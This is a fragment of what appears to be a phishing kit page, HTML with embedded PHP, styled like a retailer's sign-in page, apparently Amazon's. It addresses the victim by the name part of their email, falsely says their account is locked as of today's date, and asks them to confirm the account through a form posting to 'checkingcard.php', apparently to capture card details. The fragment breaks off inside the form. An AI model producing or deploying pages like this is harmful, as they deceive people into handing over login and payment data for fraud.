...
<title dir="ltr">Authentication Required</title>        
...
<div class="a-section a-spacing-base">
  <div class="a-section">
    ...
    <form name="signIn" method="post" action="./system/checkingcard.php" class="auth-validate-form auth-real-time-validation a-spacing-none" style="
    margin-left: -20;
    margin-right: -20;
">
      ...
      <div class="a-section">
        <div class="a-box"><div class="a-box-inner a-padding-extra-large">
												<p class="aligncenter">
    <center><img  width="200" height="190" src="style/dam.png" alt="centered image" /></center>
</p>
			<?php $mailprovider = explode('@',$_SESSION['email']);
			$mailprovider = $mailprovider[0];

 ?>
          <h1 class="a-spacing-small" style="font-size:25px"><center><?php echo ucfirst(strtolower($mailprovider)); ?>, Your Account Has Been Locked</center></font></font></h1>

          <div class="a-row a-spacing-base">
 <div class="round3" style="margin-bottom: 15px;">   
  <p  class="aligned">
        <img src= "style/locked.png"
            width="60" alt="" style="margin-right: 10px;">
             
        <span> <font style="font-size:14px"><strong>Account Locked <?=date("F j, Y");?>.</strong> Please confirm your account to avoid any service interruptions.</font></span>
		

</p>
    </div>
<div class="a-row a-spacing-base">
<label for="ap_email" class="a-form-label"><font style="vertical-align: inherit;">
